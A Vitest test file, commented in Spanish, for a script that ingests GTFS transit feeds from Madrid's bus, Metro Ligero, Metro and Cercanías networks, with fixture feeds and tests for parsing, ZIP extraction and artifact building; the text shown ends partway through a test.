import { describe, expect, it } from 'vitest';
import zlib from 'node:zlib';
import {
  buildArtifacts,
  buildShapes,
  cleanCercaniasLineName,
  cleanTripDest,
  compareLabels,
  extractGtfsFiles,
  feedCalendarEnd,
  feedIsStale,
  normalizeCercaniasFiles,
  normalizeColor,
  normalizeRouteUrl,
  normalizeZone,
  parseCsvLine,
  parseFrequencies,
  parseGtfsTable,
  parseHms,
  parseShapePoints,
  readZip,
  simplifyPoints,
  splitShapeParts,
  validateArtifacts,
  validateShapes,
  withRetries,
  ymdPlusDays,
  zipEntryBuffer,
} from '../../scripts/crtm-ingest.mjs';

function gtfs(text) {
  return Buffer.from(`${text}\n`, 'utf8');
}

const FEED_A = {
  network: 'interurban',
  files: {
    'stops.txt': gtfs(
      'stop_id,stop_code,stop_name,stop_desc,stop_lat,stop_lon,zone_id,location_type\n' +
        'par_8_00001,00001,ALPHA,"Calle Alpha, 1",40.1,-3.1,Zona A,0\n' +
        'par_8_00002,00002,BETA,Calle Beta 2,40.2,-3.2,b1 ,0\n' +
        'par_8_00003,00003,SIN_SERVICIO,Calle Gamma 3,40.3,-3.3,,0',
    ),
    'routes.txt': gtfs(
      'route_id,agency_id,route_short_name,route_long_name,route_desc,route_type,route_url\n' +
        '8__1___,CRTM,1,ALFA-BETA,,3,https://crtm.es/a',
    ),
    'trips.txt': gtfs(
      'route_id,service_id,trip_id,trip_headsign,trip_short_name,direction_id\n' +
        '8__1___,S1,T1,BETA,,0\n' +
        '8__1___,S1,T2,ALFA,,1',
    ),
    'calendar.txt': gtfs(
      'service_id,monday,tuesday,wednesday,thursday,friday,saturday,sunday,start_date,end_date\n' +
        'S1,1,1,1,1,1,0,0,20260101,20261231',
    ),
    'calendar_dates.txt': gtfs('service_id,date,exception_type\nS1,20260815,2'),
    'feed_info.txt': gtfs(
      'feed_publisher_name,feed_publisher_url,feed_lang,feed_start_date,feed_end_date,feed_version\n' +
        ',,,,,20260101',
    ),
    'stop_times.txt': gtfs(
      'trip_id,arrival_time,departure_time,stop_id,stop_sequence,stop_headsign,pickup_type,drop_off_type,shape_dist_traveled\n' +
        'T2,25:30:00,25:30:00,par_8_00002,0,,,,\n' +
        'T2,25:40:00,25:40:00,par_8_00001,1,,,,\n' +
        'T1,05:00:00,05:00:00,par_8_00001,0,,,,\n' +
        'T1,05:10:00,05:10:00,par_8_00002,1,,,,',
    ),
  },
};

const FEED_B = {
  network: 'urban',
  files: {
    'stops.txt': gtfs(
      'stop_id,stop_code,stop_name,stop_desc,stop_lat,stop_lon,zone_id,location_type\n' +
        'par_9_00101,101,DELTA,Calle Delta 4,40.4,-3.4,C1,0',
    ),
    'routes.txt': gtfs(
      'route_id,agency_id,route_short_name,route_long_name,route_desc,route_type,route_url\n' +
        '9__1___,CRTM,1,CIRCULAR DELTA,,3,https://crtm.es/b',
    ),
    'trips.txt': gtfs(
      'route_id,service_id,trip_id,trip_headsign,direction_id\n9__1___,S9,T9,DELTA,0',
    ),
    'calendar.txt': null,
    'calendar_dates.txt': gtfs('service_id,date,exception_type\nS9,20260701,1'),
    'feed_info.txt': null,
    'stop_times.txt': gtfs(
      'trip_id,arrival_time,departure_time,stop_id,stop_sequence\n' +
        'T9,08:15:00,08:15:00,par_9_00101,0',
    ),
  },
};

function buildFixture() {
  const munis = new Map([
    ['00001', 'Alcobendas'],
    ['00101', 'Aranjuez'],
  ]);
  return buildArtifacts([FEED_A, FEED_B], munis);
}

// Metro Ligero (M10): códigos namespacelados desde stop_id, municipio por NN, colores de ruta
const FEED_ML = {
  network: 'ml',
  namespaceStopIds: true,
  muniStrategy: 'nn',
  files: {
    'stops.txt': gtfs(
      'stop_id,stop_code,stop_name,stop_desc,stop_lat,stop_lon,zone_id,location_type\n' +
        'par_10_5,101,SOMOSAGUAS,,40.2001,-3.2001,,0\n' + // stop_code '101' = el de FEED_B, pero se namespacela
        'par_10_6,106,AISLADA,,41.0,-3.2,,0', // sin parada de bus con municipio a <1 km
    ),
    'routes.txt': gtfs(
      'route_id,agency_id,route_short_name,route_long_name,route_desc,route_type,route_url,route_color,route_text_color\n' +
        '10__ML2___,CRTM,ML2,ML2 COLONIA JARDIN - ARAVACA,,0,, 8ebf42 ,ffffff',
    ),
    'trips.txt': gtfs(
      'route_id,service_id,trip_id,trip_headsign,trip_short_name,direction_id,shape_id\n' +
        '10__ML2___,SML,TML1,ARAVACA,COLONIA JARDIN-ESTACION DE ARAVACA,0,SH_ML_A',
    ),
    'calendar.txt': gtfs(
      'service_id,monday,tuesday,wednesday,thursday,friday,saturday,sunday,start_date,end_date\n' +
        'SML,1,1,1,1,1,1,1,20260101,20271231',
    ),
    'calendar_dates.txt': gtfs('service_id,date,exception_type\nSML,20260810,2'),
    'feed_info.txt': gtfs(
      'feed_publisher_name,feed_publisher_url,feed_lang,feed_start_date,feed_end_date,feed_version\n,,,,,20260722',
    ),
    'stop_times.txt': gtfs(
      'trip_id,arrival_time,departure_time,stop_id,stop_sequence\n' +
        'TML1,07:00:00,07:00:00,par_10_5,0\n' +
        'TML1,07:02:00,07:02:00,par_10_6,1',
    ),
    'shapes.txt': gtfs(
      'shape_id,shape_pt_lat,shape_pt_lon,shape_pt_sequence\n' +
        'SH_ML_A,40.20000,-3.20000,1\n' +
        'SH_ML_A,40.20050,-3.20000,2',
    ),
  },
};

function buildMLFixture() {
  const munis = new Map([
    ['00001', 'Alcobendas'],
    ['00101', 'Aranjuez'],
    ['00002', 'Las Rozas'],
  ]);
  return buildArtifacts([FEED_A, FEED_B, FEED_ML], munis);
}

// Metro (M4): códigos 4_<n>, municipio NN, colores de ruta y trips plantilla de frequencies.txt
const FEED_METRO = {
  network: 'metro',
  namespaceStopIds: true,
  muniStrategy: 'nn',
  files: {
    'stops.txt': gtfs(
      'stop_id,stop_code,stop_name,stop_desc,stop_lat,stop_lon,zone_id,location_type\n' +
        'par_4_100,100,CHAMARTIN,,40.1002,-3.1001,,0\n' + // stop_code '100' crudo no colisiona (bus usa 00001/00002/101), pero se namespacela igual
        'par_4_101,200,ATOCHA,,40.1004,-3.1002,,0',
    ),
    'routes.txt': gtfs(
      'route_id,agency_id,route_short_name,route_long_name,route_desc,route_type,route_url,route_color,route_text_color\n' +
        '4__1_____,CRTM,1,PINAR DE CHAMARTIN - VALDECARROS,,1,,58ABE8,FFFFFF',
    ),
    'trips.txt': gtfs(
      'route_id,service_id,trip_id,trip_headsign,direction_id,shape_id\n' +
        '4__1_____,S4,T4A,VALDECARROS,0,SH_M1_A\n' +
        '4__1_____,S4,T4B,PINAR DE CHAMARTIN,1,SH_M1_B\n' +
        '4__1_____,S4,T4C,PINAR DE CHAMARTIN,1,SH_M1_B\n',
    ),
    'calendar.txt': gtfs(
      'service_id,monday,tuesday,wednesday,thursday,friday,saturday,sunday,start_date,end_date\n' +
        'S4,1,1,1,1,1,1,1,20260101,20271231',
    ),
    'calendar_dates.txt': null,
    'feed_info.txt': gtfs(
      'feed_publisher_name,feed_publisher_url,feed_lang,feed_start_date,feed_end_date,feed_version\n,,,,,20260722',
    ),
    'stop_times.txt': gtfs(
      'trip_id,arrival_time,departure_time,stop_id,stop_sequence\n' +
        'T4A,00:00:00,00:00:00,par_4_100,0\n' +
        'T4A,00:05:00,00:05:00,par_4_101,1\n' +
        'T4B,00:00:00,00:00:00,par_4_101,0\n' +
        'T4B,00:05:00,00:05:00,par_4_100,1\n' +
        'T4C,05:30:00,05:30:00,par_4_101,0\n' +
        'T4C,05:35:00,05:35:00,par_4_100,1',
    ),
    'frequencies.txt': gtfs(
      'trip_id,start_time,end_time,headway_secs,exact_times\n' +
        'T4A,06:00:00,07:00:00,600,\n' +
        'T4A,07:00:00,09:30:00,300,\n' +
        'T4B,26:00:00,26:30:00,900,\n' +
        'FANTOMA,08:00:00,09:00:00,600,\n' +
        'T4A,BAD:00,09:00:00,600,\n' +
        'T4A,10:00:00,10:00:00,600,\n' +
        'T4A,11:00:00,12:00:00,0,',
    ),
    'shapes.txt': gtfs(
      'shape_id,shape_pt_lat,shape_pt_lon,shape_pt_sequence\n' +
        'SH_M1_A,40.10000,-3.10000,1\n' +
        'SH_M1_A,40.10060,-3.10000,2\n' +
        'SH_M1_B,40.10000,-3.10000,1\n' +
        'SH_M1_B,40.10060,-3.10000,2',
    ),
  },
};

function buildMetroFixture() {
  const munis = new Map([
    ['00001', 'Alcobendas'],
    ['00101', 'Aranjuez'],
    ['00002', 'Las Rozas'],
  ]);
  const feeds = [FEED_A, FEED_B, FEED_ML, FEED_METRO];
  const art = buildArtifacts(feeds, munis);
  art.__feeds = feeds;
  return art;
}

// GTFS Cercanías Renfe (NAP): TODA España (rutas 10T* Madrid + otros núcleos), una
// dirección por route_id SIN direction_id, campos con padding de ancho fijo y encoding
// windows-1252 (las líneas con acentos van en cp1252 real, las ASCII decodifican como UTF-8)
function gtfs1252(text) {
  const bytes = [];
  const map = { í: 0xed, á: 0xe1, é: 0xe9, ó: 0xf3, ú: 0xfa, ñ: 0xf1, Í: 0xcd, Á: 0xc1 };
  for (const ch of `${text}\n`) {
    const code = ch.codePointAt(0);
    if (code < 0x80) bytes.push(code);
    else if (map[ch] !== undefined) bytes.push(map[ch]);
    else bytes.push(...Buffer.from(ch, 'utf8'));
  }
  return Buffer.from(bytes);
}

const FEED_CERCANIAS = {
  network: 'cercanias',
  stopCodePrefix: 'r_',
  muniStrategy: 'nn',
  files: {
    'stops.txt': gtfs1252(
      'stop_id,stop_name,stop_lat,stop_lon,wheelchair_boarding\n' +
        '10200,Príncipe Pío,40.1001,-3.1001,1\n' +
        '10201,Chamartín - Clara Campoamor,40.1002,-3.1002,1\n' +
        '10202,Aeropuerto T4,40.1003,-3.1003,1\n' +
        '10203,Alcalá de Henares,41.5,-3.5,1\n' +
        '10299,Zaragoza Delicias,41.65,-0.91,1',
    ),
    'routes.txt': gtfs1252(
      'route_id,route_short_name,route_long_name,route_type,route_color,route_text_color\n' +
        '10T0001C1  ,C1  ,Principe Pio                            -Aeropuerto-T4       ,2,75B6E0,FFFFFF\n' +
        '10T0002C1  ,C1  ,Aeropuerto-T4                           -Principe Pio        ,2,75B6E0,FFFFFF\n' +
        '10T0003C1  ,C1  ,Alcalá de Henares                       -                    ,2,75B6E0,FFFFFF\n' +
        '51T0001C1  ,C1  ,Zaragoza-Otro Núcleo                                         ,2,111111,FFFFFF',
    ),
    'trips.txt': gtfs1252(
      'route_id,service_id,trip_id,trip_headsign,wheelchair_accessible,block_id,shape_id\n' +
        '10T0001C1  ,1035M,C1A,       ,1,,10_C1\n' +
        '10T0001C1  ,1036X,C1B,       ,1,,10_C1\n' +
        '10T0002C1  ,1035M,C1C,       ,1,,10_C1\n' +
        '10T0003C1  ,1035M,C1D,       ,1,,10_C1\n' +
        '51T0001C1  ,1035M,X1,ZARAGOZA,1,,',
    ),
    'calendar.txt': gtfs(
      'service_id,monday,tuesday,wednesday,thursday,friday,saturday,sunday,start_date,end_date\n' +
        '1035M,1,0,0,0,0,0,0,20260825,20260825\n' +
        '1036X,0,1,0,0,0,0,0,20260826,20260826',
    ),
    'calendar_dates.txt': null,
    'feed_info.txt': null,
    'stop_times.txt': gtfs(
      'trip_id,arrival_time,departure_time,stop_id,stop_sequence\n' +
        'C1A,06:00:00,06:00:00,10200,1\n' +
        'C1A,06:10:00,06:10:00,10201,2\n' +
        'C1A,06:30:00,06:30:00,10202,3\n' +
        'C1B,25:00:00,25:00:00,10200,1\n' +
        'C1B,25:30:00,25:30:00,10202,2\n' +
        'C1C,08:00:00,08:00:00,10202,1\n' +
        'C1C,08:30:00,08:30:00,10200,2\n' +
        'C1D,09:00:00,09:00:00,10203,1\n' +
        'C1D,09:40:00,09:40:00,10200,2\n' +
        'X1,07:00:00,07:00:00,10299,1',
    ),
    'shapes.txt': gtfs(
      'shape_id,shape_pt_lat,shape_pt_lon,shape_pt_sequence\n' +
        '10_C1,40.10000,-3.10000,1\n' +
        '10_C1,40.10060,-3.10000,2',
    ),
  },
};

function buildCercaniasFixture() {
  const { files } = normalizeCercaniasFiles(structuredCloneLikeFeed(FEED_CERCANIAS), {
    routeIdPrefix: '10T',
    version: '20260825_040012_RENFE_CERCA',
  });
  const feed = { ...FEED_CERCANIAS, files, destFromTripTerminal: true, rtTripIds: true };
  const munis = new Map([
    ['00001', 'Alcobendas'],
    ['00101', 'Aranjuez'],
    ['00002', 'Las Rozas'],
  ]);
  const feeds = [FEED_A, FEED_B, FEED_ML, feed];
  const art = buildArtifacts(feeds, munis);
  art.__feeds = feeds;
  return art;
}

// normalizeCercaniasFiles no muta los buffers de entrada, pero el feed se reutiliza entre
// tests: se clona la referencia de ficheros (los Buffers son de solo lectura en la práctica)
function structuredCloneLikeFeed(feed) {
  return { ...feed.files };
}

describe('parseCsvLine', () => {
  it('separa campos simples', () => {
    expect(parseCsvLine('a,b,c')).toEqual(['a', 'b', 'c']);
  });

  it('respeta comillas con comas y comillas escapadas', () => {
    expect(parseCsvLine('"x,y",z,"dices ""hola""",')).toEqual(['x,y', 'z', 'dices "hola"', '']);
  });
});

describe('parseHms', () => {
  it('convierte horas normales', () => {
    expect(parseHms('05:40:00')).toBe(20400);
  });

  it('mantiene servicios de madrugada >= 24h', () => {
    expect(parseHms('25:30:00')).toBe(91800);
  });

  it('rechaza valores invalidos', () => {
    expect(parseHms('')).toBeNull();
    expect(parseHms('abc')).toBeNull();
    expect(parseHms('48:00:00')).toBeNull();
    expect(parseHms('05:99:00')).toBeNull();
  });
});

describe('parseFrequencies', () => {
  it('agrupa bandas por trip plantilla con horas ≥24:00 y descuenta filas inválidas', () => {
    const { byTrip, invalid } = parseFrequencies(
      gtfs(
        'trip_id,start_time,end_time,headway_secs,exact_times\n' +
          'T1,06:00:00,07:00:00,600,\n' +
          'T1,25:30:00,26:30:00,900,1\n' + // madrugada ≥24:00; exact_times se ignora
          'T2,08:00:00,09:00:00,300,\n' +
          'T2,xx:00:00,09:00:00,300,\n' +
          'T2,10:00:00,10:00:00,300,\n' +
          'T2,11:00:00,12:00:00,-5,\n' +
          'T2,11:00:00,10:00:00,300,',
      ),
    );
    expect(byTrip.get('T1')).toEqual([
      { from: 6 * 3600, to: 7 * 3600, headway: 600 },
      { from: 25.5 * 3600, to: 26.5 * 3600, headway: 900 },
    ]);
    expect(byTrip.get('T2')).toEqual([{ from: 8 * 3600, to: 9 * 3600, headway: 300 }]);
    expect(byTrip.has('T3')).toBe(false);
    expect(invalid).toBe(4);
  });

  it('devuelve mapa vacío con fichero ausente o sin filas', () => {
    expect(parseFrequencies(null).byTrip.size).toBe(0);
    expect(parseFrequencies(gtfs('trip_id,start_time,end_time,headway_secs')).invalid).toBe(0);
  });
});

describe('normalizeZone', () => {
  it('normaliza vacios, prefijos y mayusculas', () => {
    expect(normalizeZone('')).toBeNull();
    expect(normalizeZone('Zona A')).toBe('A');
    expect(normalizeZone('b1 ')).toBe('B1');
    expect(normalizeZone('SZ')).toBe('SZ');
  });
});

describe('compareLabels', () => {
  it('ordena numericamente los digitos', () => {
    expect(['10', '2', '1', 'N401'].sort(compareLabels)).toEqual(['1', '2', '10', 'N401']);
  });
});

describe('readZip / zipEntryBuffer / extractGtfsFiles', () => {
  function buildZip(entries) {
    const local = [];
    const central = [];
    let offset = 0;
    for (const e of entries) {
      const nameBuf = Buffer.from(e.name);
      const data = e.method === 8 ? zlib.deflateRawSync(Buffer.from(e.data)) : Buffer.from(e.data);
      const lfh = Buffer.alloc(30);
      lfh.writeUInt32LE(0x04034b50, 0);
      lfh.writeUInt16LE(e.method ?? 0, 8);
      lfh.writeUInt32LE(data.length, 18);
      lfh.writeUInt32LE(Buffer.from(e.data).length, 22);
      lfh.writeUInt16LE(nameBuf.length, 26);
      local.push(Buffer.concat([lfh, nameBuf, data]));
      const cde = Buffer.alloc(46);
      cde.writeUInt32LE(0x02014b50, 0);
      cde.writeUInt16LE(e.method ?? 0, 10);
      cde.writeUInt32LE(data.length, 20);
      cde.writeUInt32LE(Buffer.from(e.data).length, 24);
      cde.writeUInt16LE(nameBuf.length, 28);
      cde.writeUInt32LE(offset, 42);
      central.push(Buffer.concat([cde, nameBuf]));
      offset += 30 + nameBuf.length + data.length;
    }
    const cd = Buffer.concat(central);
    const eocd = Buffer.alloc(22);
    eocd.writeUInt32LE(0x06054b50, 0);
    eocd.writeUInt16LE(entries.length, 8);
    eocd.writeUInt16LE(entries.length, 10);
    eocd.writeUInt32LE(cd.length, 12);
    eocd.writeUInt32LE(offset, 16);
    return Buffer.concat([...local, cd, eocd]);
  }

  it('lee entradas store y deflate', () => {
    const zip = buildZip([
      { name: 'a.txt', data: 'hello', method: 0 },
      { name: 'b.txt', data: 'world!', method: 8 },
    ]);
    const entries = readZip(zip);
    expect([...entries.keys()].sort()).toEqual(['a.txt', 'b.txt']);
    expect(zipEntryBuffer(zip, entries.get('a.txt')).toString()).toBe('hello');
    expect(zipEntryBuffer(zip, entries.get('b.txt')).toString()).toBe('world!');
  });

  it('extrae ficheros GTFS y exige los obligatorios (frequencies.txt opcional)', () => {
    const files = extractGtfsFiles(
      buildZip([
        { name: 'stops.txt', data: 'stop_id\nx', method: 0 },
        { name: 'routes.txt', data: 'r', method: 0 },
        { name: 'trips.txt', data: 't', method: 0 },
        { name: 'stop_times.txt', data: 's', method: 0 },
        { name: 'frequencies.txt', data: 'trip_id,start_time,end_time,headway_secs', method: 0 },
      ]),
    );
    expect(files['stops.txt'].toString()).toContain('stop_id');
    expect(files['calendar.txt']).toBeNull();
    expect(files['frequencies.txt'].toString()).toContain('trip_id');
    expect(() =>
      extractGtfsFiles(buildZip([{ name: 'routes.txt', data: 'r', method: 0 }])),
    ).toThrow(/stops.txt/);
  });

  it('extrae ficheros GTFS anidados en una carpeta (items ArcGIS desde 2026-11-05)', () => {
    const files = extractGtfsFiles(
      buildZip([
        { name: 'google_transit_M89/', data: '', method: 0 },
        { name: 'google_transit_M89/stops.txt', data: 'stop_id\nx', method: 0 },
        { name: 'google_transit_M89/routes.txt', data: 'r', method: 0 },
        { name: 'google_transit_M89/trips.txt', data: 't', method: 0 },
        { name: 'google_transit_M89/stop_times.txt', data: 's', method: 8 },
        { name: 'google_transit_M89/calendar.txt', data: 'c', method: 0 },
      ]),
    );
    expect(files['stops.txt'].toString()).toContain('stop_id');
    expect(files['calendar.txt'].toString()).toBe('c');
    expect(() =>
      extractGtfsFiles(
        buildZip([
          { name: 'google_transit_M89/routes.txt', data: 'r', method: 0 },
          { name: 'google_transit_M89/trips.txt', data: 't', method: 0 },
          { name: 'google_transit_M89/stop_times.txt', data: 's', method: 0 },
        ]),
      ),
    ).toThrow(/stops.txt/);
  });

  it('carpeta anidada ambigua (mismo fichero en dos carpetas) y raíz con prioridad', () => {
    expect(() =>
      extractGtfsFiles(
        buildZip([
          { name: 'a/stops.txt', data: 's', method: 0 },
          { name: 'b/stops.txt', data: 's', method: 0 },
          { name: 'a/routes.txt', data: 'r', method: 0 },
          { name: 'a/trips.txt', data: 't', method: 0 },
          { name: 'a/stop_times.txt', data: 'st', method: 0 },
        ]),
      ),
    ).toThrow(/stops.txt.*2 carpetas/);
    const files = extractGtfsFiles(
      buildZip([
        { name: 'stops.txt', data: 'raiz', method: 0 },
        { name: 'google_transit_M9/stops.txt', data: 'anidado', method: 0 },
        { name: 'routes.txt', data: 'r', method: 0 },
        { name: 'trips.txt', data: 't', method: 0 },
        { name: 'stop_times.txt', data: 's', method: 0 },
        { name: 'google_transit_M9/shapes.txt', data: 'sh', method: 0 },
      ]),
    );
    expect(files['stops.txt'].toString()).toBe('raiz');
    expect(files['shapes.txt'].toString()).toBe('sh');
  });
});

describe('cleanTripDest', () => {
  it('label solo, con prefijo de tipo de día (incl. Lv mayúscula) y variante entre paréntesis', () => {
    expect(cleanTripDest('421 PINTO', '421')).toBe('PINTO');
    expect(cleanTripDest('ls 1 ALFA (por Polígano)', '1')).toBe('ALFA (por Polígano)');
    expect(cleanTripDest('Lv 261 MADRID (Av. de América)', '261')).toBe('MADRID (Av. de América)');
    expect(cleanTripDest('vsvf 261 NUEVO BAZTÁN (urb. Monteacevedo)', '261')).toBe(
      'NUEVO BAZTÁN (urb. Monteacevedo)',
    );
    expect(cleanTripDest('sdf 6 EST. LA GARENA (c.Colegios peatonal)', '6')).toBe(
      'EST. LA GARENA (c.Colegios peatonal)',
    );
  });

  it('sin label detrás (corredor ml/metro, destinos sin label, label ajeno) → null', () => {
    expect(cleanTripDest('PINAR DE CHAMARTIN-LAS TABLAS', 'ML2')).toBeNull();
    expect(cleanTripDest('TRANVIA DE PARLA ANDEN 1', 'ML4')).toBeNull();
    expect(cleanTripDest('Por bus-VAO', '421')).toBeNull();
    expect(cleanTripDest('MADRID (Pavones)-MORATA DE TAJUÑA', '261')).toBeNull();
    expect(cleanTripDest('422 PINTO', '421')).toBeNull(); // label de otra línea
  });

  it('vacío tras la limpieza o sin short_name → null', () => {
    expect(cleanTripDest('421', '421')).toBeNull();
    expect(cleanTripDest('ls 421', '421')).toBeNull();
    expect(cleanTripDest('', '421')).toBeNull();
    expect(cleanTripDest(undefined, '421')).toBeNull();
  });

  it('colapsa espacios y recorta a 100 caracteres', () => {
    expect(cleanTripDest('421   PINTO    CENTRO', '421')).toBe('PINTO CENTRO');
    expect(cleanTripDest(`421 ${'X'.repeat(150)}`, '421')).toHaveLength(100);
  });
});

describe('buildArtifacts', () => {
  it('construye stops/lines/docs con merge, municipios y horas >=24h', () => {
    const art = buildFixture();
    expect(art.stops.map((s) => s.code)).toEqual(['101', '00001', '00002'].sort(compareLabels));

    const alpha = art.stops.find((s) => s.code === '00001');
    expect(alpha.municipality).toBe('Alcobendas');
    expect(alpha.zone).toBe('A');
    expect(alpha.address).toBe('Calle Alpha, 1');
    expect(alpha.lines).toEqual(['1']);

    const delta = art.stops.find((s) => s.code === '101');
    expect(delta.municipality).toBe('Aranjuez');

    expect(art.stops.some((s) => s.code === '00003')).toBe(false);

    const docA = art.lineDocs.get('8__1___');
    expect(docA.network).toBe('interurban');
    expect(docA.trips.map((t) => t.dep)).toEqual([18000, 91800]);
    expect(docA.trips[1].stops).toEqual(['00002@0', '00001@600']);
    expect(docA.services).toHaveLength(1);
    expect(docA.services[0].days).toEqual([1, 1, 1, 1, 1, 0, 0]);
    expect(docA.services[0].exceptions).toEqual({ 20260815: 2 });
    expect(docA.directions).toHaveLength(2);
    expect(docA.directions.find((d) => d.id === 0).stops[0]).toBe('00001');

    const docB = art.lineDocs.get('9__1___');
    expect(docB.services).toHaveLength(1);
    expect(docB.services[0].days).toEqual([0, 0, 0, 0, 0, 0, 0]);
    expect(docB.services[0].from).toBeNull();
    expect(docB.services[0].exceptions).toEqual({ 20260701: 1 });

    expect(art.counts.orphan).toEqual({ stopRefs: 0, routeRefs: 0, serviceRefs: 0 });
    expect(art.lines.map((l) => l.routeId).sort()).toEqual(['8__1___', '9__1___']);
  });

  it('cuenta referencias huerfanas', () => {
    const broken = {
      network: 'urban',
      files: {
        ...FEED_B.files,
        'stop_times.txt': gtfs(
          'trip_id,arrival_time,departure_time,stop_id,stop_sequence\nT9,08:15:00,08:15:00,par_9_99999,0',
        ),
      },
    };
    const art = buildArtifacts([broken], new Map());
    expect(art.counts.orphan.stopRefs).toBe(1);
    expect(art.stops).toHaveLength(0);
  });

  it('merges feed ml sin colisionar stop_code con bus (namespace desde stop_id)', () => {
    const art = buildMLFixture();
    expect(art.counts.codeCollisions).toBe(0);

    const mlStop = art.stops.find((s) => s.code === '10_5');
    expect(mlStop).toBeDefined();
    expect(mlStop.lines).toEqual(['ML2']);
    expect(art.stops.some((s) => s.code === '101')).toBe(true); // el stop_code '101' de bus sigue existiendo
    expect(art.counts.routes.ml).toBe(1);
    expect(art.counts.lineDocs.ml).toBe(1);
  });

  it('municipio de ml por vecino de bus más cercano (NN, umbral 1 km), nunca por poste', () => {
    const art = buildMLFixture();

    // par_10_5 (40.2001,-3.2001) pega con la parada de bus 00002 (40.2,-3.2 → 'Las Rozas');
    // su stop_code crudo '101' llevaría a 'Aranjuez' si se aplicara el join de postes
    expect(art.stops.find((s) => s.code === '10_5').municipality).toBe('Las Rozas');
    expect(art.stops.find((s) => s.code === '10_6').municipality).toBeNull();
    expect(art.counts.nnMuni).toEqual({ total: 2, resolved: 1 });
  });

  it('color/textColor de route_color/route_text_color en lines y docs (bus sin color)', () => {
    const art = buildMLFixture();

    const mlLine = art.lines.find((l) => l.routeId === '10__ML2___');
    expect(mlLine.color).toBe('8EBF42');
    expect(mlLine.textColor).toBe('FFFFFF');
    const doc = art.lineDocs.get('10__ML2___');
    expect(doc.network).toBe('ml');
    expect(doc.color).toBe('8EBF42');
    expect(doc.textColor).toBe('FFFFFF');
    expect(art.lines.find((l) => l.routeId === '8__1___').color).toBeUndefined();
    expect(art.lineDocs.get('8__1___').color).toBeUndefined();
  });

  it('dest por trip desde trip_short_name (prefijo/label/variante) y counts.dest solo de bus', () => {
    const withShortNames = {
      network: 'interurban',
      files: {
        ...FEED_A.files,
        'trips.txt': gtfs(
          'route_id,service_id,trip_id,trip_headsign,trip_short_name,direction_id\n' +
            '8__1___,S1,T1,BETA,1 BETA,0\n' +
            '8__1___,S1,T2,ALFA,ls 1 ALFA (por Polígano),1\n' +
            '8__1___,S1,T3,ALFA,POR bus-VAO,1\n' +
            '8__1___,S1,T4,ALFA,1,1',
        ),
        'stop_times.txt': gtfs(
          'trip_id,arrival_time,departure_time,stop_id,stop_sequence\n' +
            'T1,05:00:00,05:00:00,par_8_00001,0\n' +
            'T1,05:10:00,05:10:00,par_8_00002,1\n' +
            'T3,05:30:00,05:30:00,par_8_00001,0\n' +
            'T3,05:40:00,05:40:00,par_8_00002,1\n' +
            'T4,05:50:00,05:50:00,par_8_00001,0\n' +
            'T4,06:00:00,06:00:00,par_8_00002,1\n' +
            'T2,25:30:00,25:30:00,par_8_00002,0\n' +
            'T2,25:40:00,25:40:00,par_8_00001,1',
        ),
      },
    };
    const art = buildArtifacts(
      [withShortNames, FEED_B],
      new Map([
        ['00001', 'Alcobendas'],
        ['00101', 'Aranjuez'],
      ]),
    );

    const doc = art.lineDocs.get('8__1___');
    expect(doc.trips.map((t) => t.dest)).toEqual([
      'BETA', // T1 05:00
      undefined, // T3 05:30 "POR bus-VAO" sin label → sin dest
      undefined, // T4 05:50 "1" solo → vacío tras limpieza
      'ALFA (por Polígano)', // T2 25:30
    ]);
    // FEED_B (bus sin columna trip_short_name) no aporta estadísticas
    expect(art.counts.dest).toEqual({ conShortName: 4, conDest: 2, sinLabel: 2 });
  });

  it('short_name de ml (nombre de corredor, sin label) no genera dest ni cuenta en stats', () => {
    const art = buildMLFixture();
    expect(art.lineDocs.get('10__ML2___').trips[0].dest).toBeUndefined();
    expect(art.counts.dest).toEqual({ conShortName: 0, conDest: 0, sinLabel: 0 });
  });

  it('detecta colisión de códigos públicos entre redes y la reporta la validación', () => {
    const urbanColliding = {
      network: 'urban',
      files: {
        ...FEED_B.files,
        'stops.txt': gtfs(
          'stop_id,stop_code,stop_name,stop_desc,stop_lat,stop_lon,zone_id,location_type\n' +
            'par_9_00101,101,DELTA,Calle Delta 4,40.4,-3.4,C1,0\n' +
            'par_9_00999,10_5,FANTASMA,,40.41,-3.41,,0',
        ),
      },
    };
    const art = buildArtifacts([urbanColliding, FEED_ML], new Map());
    expect(art.counts.codeCollisions).toBe(1);
    expect(art.counts.orphan.stopRefs).toBe(1); // la fila de par_10_5 referencia la parada descartada por colisión
    expect(validateArtifacts(art).some((e) => e.includes('códigos de parada duplicados'))).toBe(
      true,
    );
  });

  it('shapes de ml: doc con network ml, color y shapeId por dirección', () => {
    const art = buildMLFixture();
    expect(art.shapeSelection.get('10__ML2___').get(0).shapeId).toBe('SH_ML_A');

    const { docs } = buildShapes([FEED_ML], art.lineDocs, art.shapeSelection);
    const doc = docs.get('10__ML2___');
    expect(doc.network).toBe('ml');
    expect(doc.color).toBe('8EBF42');
    expect(doc.textColor).toBe('FFFFFF');
    expect(doc.directions[0].shapeId).toBe('SH_ML_A');
    expect(doc.directions[0].geometry.type).toBe('MultiLineString');
  });

  it('merges feed metro con frequencies: códigos 4_<n>, NN de municipio y trips plantilla con bandas', () => {
    const art = buildMetroFixture();
    expect(art.counts.codeCollisions).toBe(0);
    expect(art.counts.networks).toContain('metro');

    const metroStop = art.stops.find((s) => s.code === '4_100');
    expect(metroStop).toBeDefined();
    expect(metroStop.lines).toEqual(['1']); // label de metro colisiona con el '1' del bus: docs separados por routeId
    expect(metroStop.municipality).toBe('Alcobendas'); // NN contra la parada de bus 00001 (40.1, -3.1)
    expect(art.counts.nnMuni).toEqual({ total: 4, resolved: 3 }); // ml 1/2 + metro 2/2

    const doc = art.lineDocs.get('4__1_____');
    expect(doc.network).toBe('metro');
    expect(doc.color).toBe('58ABE8');
    expect(doc.directions.map((d) => d.id)).toEqual([0, 1]);
    const freqTrip = doc.trips.find((t) => t.freq);
    expect(freqTrip.freq).toEqual([
      { from: 6 * 3600, to: 7 * 3600, headway: 600 },
      { from: 7 * 3600, to: 9.5 * 3600, headway: 300 },
    ]);
    expect(freqTrip.dep).toBeUndefined(); // trip plantilla: dep fuera del doc, expansión en query time
    expect(freqTrip.stops).toEqual(['4_100@0', '4_101@300']);
    expect(doc.trips.find((t) => !t.freq).dep).toBe(5.5 * 3600); // trip programado sin bandas conserva dep

    expect(art.counts.frequencies).toEqual({
      trips: 2,
      bands: 3,
      departures: 38,
      orphanRefs: 1,
      invalidRows: 3,
    });
  });

  it('frequencies: filas con trip inexistente cuentan como orphan (observable) sin tumbar la validación', () => {
    const art = buildMetroFixture();
    expect(art.counts.frequencies.orphanRefs).toBe(1);
    const errors = validateArtifacts(art);
